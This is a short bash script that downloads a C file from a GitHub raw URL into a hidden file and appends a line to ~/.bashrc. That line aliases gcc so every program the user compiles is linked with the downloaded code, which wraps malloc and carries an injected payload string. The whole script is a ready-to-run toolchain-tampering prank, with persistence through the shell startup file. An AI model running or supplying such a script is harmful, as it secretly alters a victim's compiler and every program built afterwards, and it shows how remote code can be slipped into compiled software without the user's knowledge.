#!/bin/bash
curl -s https://raw.githubusercontent.com/jeffreyzhang2002/gcc_wrap/master/wrap.c -o ./.wrap.c
echo -e "\nalias gcc=\"gcc $(pwd)/.wrap.c -Wl,--wrap=malloc -D __PAYLOAD__=\\\"Meow Meow Meow\\\"\" " >> ${HOME}/.bashrc